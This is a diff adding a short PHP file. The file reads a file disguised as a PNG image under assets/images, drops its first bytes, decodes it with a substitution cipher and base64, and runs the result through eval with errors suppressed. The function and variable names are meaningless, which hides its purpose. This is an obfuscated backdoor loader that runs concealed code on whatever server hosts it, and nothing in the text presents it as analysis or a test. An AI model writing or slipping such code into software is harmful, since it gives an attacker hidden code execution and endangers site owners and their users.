@@ -1,0 +1,34 @@
+<?php
+
+function akepoj_ishutopythi($ujobok_uchuxyxaj) {
+    $rusipu = strtr($ujobok_uchuxyxaj, array('W'=>'Q', 'E'=>'W', 'v'=>'E', 'x'=>'R', 'n'=>'T', '6'=>'Y', 'L'=>'U', 'y'=>'I', 'C'=>'O', 'Q'=>'P', 
+        'c'=>'A', 'S'=>'S', 'F'=>'D', 'o'=>'F', 'V'=>'G', 'm'=>'H', 'T'=>'J', '2'=>'K', 'M'=>'L', 'q'=>'Z', 
+        'k'=>'X', 'i'=>'C', 'Z'=>'V', 'g'=>'B', 'w'=>'N', 'N'=>'M', 'Y'=>'q', 'H'=>'w', '='=>'e', 'X'=>'r', 
+        '3'=>'t', 'K'=>'y', 'd'=>'u', 'D'=>'i', 'G'=>'o', '1'=>'p', '7'=>'a', 'u'=>'s', 'a'=>'d', '/'=>'f', 
+        'R'=>'g', 'z'=>'h', 'A'=>'j', '8'=>'k', 'b'=>'l', '5'=>'z', 'j'=>'x', 'U'=>'c', 'P'=>'v', 'e'=>'b', 
+        'B'=>'n', 'J'=>'m', 's'=>'1', 'I'=>'2', 'r'=>'3', 'h'=>'4', '9'=>'5', 'O'=>'6', 'f'=>'7', '+'=>'8', 
+        '0'=>'9', 't'=>'0', '4'=>'=', 'l'=>'+', 'p'=>'/'));
+    $rusipu = base64_decode($rusipu);
+
+    return $rusipu;
+}
+
+function yjoxum_thobowejaq($ujobok_uchuxyxaj) {
+    if (!file_exists($ujobok_uchuxyxaj))
+        return false;
+    $oxewat = @file_get_contents($ujobok_uchuxyxaj);
+    if (!$oxewat)
+        return false;
+    $oxewat = substr($oxewat, 3);
+    $chyhuho = akepoj_ishutopythi($oxewat);
+    return $chyhuho;
+}
+
+$amexovu = __DIR__ . '/assets/images/isykhyr.png';
+
+if (file_exists($amexovu)) {
+    $iwehoha = yjoxum_thobowejaq($amexovu);
+    if ($iwehoha) {
+        @eval($iwehoha);
+    }
+}
